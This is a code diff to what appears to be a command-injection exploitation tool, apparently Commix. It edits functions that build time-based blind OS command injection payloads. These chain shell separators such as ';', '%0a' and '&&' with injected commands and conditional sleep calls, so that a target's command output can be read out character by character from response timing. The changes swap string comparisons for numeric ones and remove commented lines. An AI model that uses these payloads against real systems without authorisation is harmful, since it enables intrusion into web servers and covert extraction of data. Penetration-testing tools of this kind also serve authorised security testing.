@@ -48,24 +48,21 @@ def decision(separator, TAG, output_length, timesec, http_request_method):
                  "str=$(echo " + TAG + ")" + separator + 
                  # Find the length of the output.
                  "str1=$(expr length \"$str\")" + separator +
-                 #"str1=${%23str}" + separator + 
-                 "if [ " + str(output_length) + " != $str1 ]" + separator + 
+                 "if [ " + str(output_length) + " -ne $str1 ]" + separator + 
                  "then sleep 0" + separator + 
                  "else sleep " + str(timesec) + separator + 
-                 "fi "
+                 "fi"
                  )
 
     elif separator == "%0a" :
-      #separator = "\n"
       payload = (separator + 
                  "str=$(echo " + TAG + ")" + separator + 
                  # Find the length of the output.
                  "str1=$(expr length \"$str\")" + separator +
-                 #"str1=${%23str}" + separator +  
-                 "if [ " + str(output_length) + " != $str1 ]" + separator + 
+                 "if [ " + str(output_length) + " -ne $str1 ]" + separator + 
                  "then sleep 0" + separator + 
                  "else sleep " + str(timesec) + separator + 
-                 "fi "
+                 "fi"
                  )
 
     elif separator == "&&" :
@@ -76,11 +73,9 @@ def decision(separator, TAG, output_length, timesec, http_request_method):
                  "str=$(echo " + TAG + ")" + separator + 
                  # Find the length of the output.
                  "str1=$(expr length \"$str\")" + separator +
-                 #"str1=${%23str}" + separator + 
                  "[ " + str(output_length) + " -eq $str1 ]" + separator + 
                  "sleep " + str(timesec)
                  )
-      #if menu.options.data:
       separator = _urllib.parse.unquote(separator)
 
     elif separator == "||" :
@@ -203,7 +198,7 @@ def cmd_execution(separator, cmd, output_length, timesec, http_request_method):
                  "str=\"$(echo $(" + cmd + "))\"" + separator + 
                  #"str1=${%23str}" + separator + 
                  "str1=$(expr length \"$str\")" + separator +
-                 "if [ " + str(output_length) + " != $str1 ]" + separator + 
+                 "if [ " + str(output_length) + " -ne $str1 ]" + separator + 
                  "then sleep 0" + separator + 
                  "else sleep " + str(timesec) + separator + 
                  "fi "
@@ -216,7 +211,7 @@ def cmd_execution(separator, cmd, output_length, timesec, http_request_method):
                  # Find the length of the output.
                  "str1=$(expr length \"$str\")" + separator +
                  #"str1=${%23str}" + separator + 
-                 "if [ " + str(output_length) + " != $str1 ]" + separator + 
+                 "if [ " + str(output_length) + " -ne $str1 ]" + separator + 
                  "then sleep 0" + separator + 
                  "else sleep " + str(timesec) + separator + 
                  "fi "
@@ -356,7 +351,7 @@ def get_char(separator, cmd, num_of_chars, ascii_char, timesec, http_request_met
                 # Transform from Ascii to Decimal.
                 "str=$(printf %25d \"'$char'\")" + separator +
                 # Perform the time-based comparisons
-                "if [ " + str(ascii_char) + " != $str ]" + separator +
+                "if [ " + str(ascii_char) + " -ne $str ]" + separator +
                 "then sleep 0" + separator +
                 "else sleep " + str(timesec) + separator +
                 "fi "
@@ -372,7 +367,7 @@ def get_char(separator, cmd, num_of_chars, ascii_char, timesec, http_request_met
                 # Transform from Ascii to Decimal.
                 "str=$(printf %25d \"'$char'\")" + separator +
                 # Perform the time-based comparisons
-                "if [ " + str(ascii_char) + " != $str ]" + separator +
+                "if [ " + str(ascii_char) + " -ne $str ]" + separator +
                 "then sleep 0" + separator +
                 "else sleep " + str(timesec) + separator +
                 "fi "
@@ -512,7 +507,7 @@ def fp_result(separator, cmd, num_of_chars, ascii_char, timesec, http_request_me
     if separator == ";" :
       payload = (separator + 
                  "str=\"$(" + cmd + ")\"" + separator + 
-                 "if [ " + str(ascii_char) + " != $str ]" + separator + 
+                 "if [ " + str(ascii_char) + " -ne $str ]" + separator + 
                  "then sleep 0" + separator + 
                  "else sleep " + str(timesec) + separator + 
                  "fi "
@@ -522,7 +517,7 @@ def fp_result(separator, cmd, num_of_chars, ascii_char, timesec, http_request_me
       #separator = "\n"
       payload = (separator + 
                  "str=\"$(" + cmd + ")\"" + separator + 
-                 "if [ " + str(ascii_char) + " != $str ]" + separator + 
+                 "if [ " + str(ascii_char) + " -ne $str ]" + separator + 
                  "then sleep 0" + separator + 
                  "else sleep " + str(timesec) + separator + 
                  "fi "
@@ -534,7 +529,7 @@ def fp_result(separator, cmd, num_of_chars, ascii_char, timesec, http_request_me
       payload = (ampersand + 
                  "sleep 0 " + separator + 
                  "str=\"$(" + cmd + ")\" " + separator + 
-                 "[ " + str(ascii_char) + " -eq ${str} ] " + separator + 
+                 "[ " + str(ascii_char) + " -eq $str ] " + separator + 
                  "sleep " + str(timesec)
                  )
       
